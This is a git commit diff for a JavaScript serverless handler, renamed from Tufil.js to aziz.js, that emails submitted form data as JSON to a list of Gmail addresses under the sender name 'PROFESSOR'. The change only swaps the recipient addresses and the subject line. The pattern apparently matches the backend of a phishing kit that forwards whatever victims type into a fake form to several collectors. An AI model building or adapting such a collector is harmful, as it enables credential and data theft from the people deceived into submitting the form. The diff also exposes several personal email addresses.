c1f4cb9f2ae346e3fd339ce27af02474bf80db7b
zm9807350 <zm9807350@gmail.com>
2025-12-22 09:29:22 +0500

    Update and rename Tufil.js to aziz.js

--- aziz.js
+++ aziz.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com",
-      subject: "Tufil",
+      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,official.marcelacelendina@gmail.com",
+      subject: "Aziz",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
